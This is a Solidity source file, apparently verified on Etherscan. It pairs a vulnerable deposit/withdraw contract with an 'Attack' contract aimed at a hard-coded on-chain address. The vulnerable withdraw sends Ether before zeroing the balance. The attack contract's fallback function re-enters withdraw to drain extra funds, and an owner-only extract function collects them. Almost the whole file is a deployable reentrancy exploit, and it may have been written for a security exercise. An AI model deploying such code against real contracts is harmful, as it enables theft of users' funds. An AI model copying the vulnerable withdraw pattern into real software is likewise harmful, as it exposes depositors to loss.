/**
 *Submitted for verification at Etherscan.io on 2021-12-01
*/

pragma solidity ^0.6.0;


// Prototype of the Vuln contract
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}



contract Attack {

    Vuln victim = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    address owner;
    uint count;

    constructor() public {
        owner = msg.sender;
        count = 0;
    }


    fallback () external payable {
        // Yay money
        count += 1;
        if (count <= 2) {
            victim.withdraw();
        }
    }

    function go() public payable {
        count = 0;
        victim.deposit.value(msg.value)();
    }

    function extract() public {
        require(msg.sender == owner);
        require(msg.sender.send(address(this).balance));
    }
}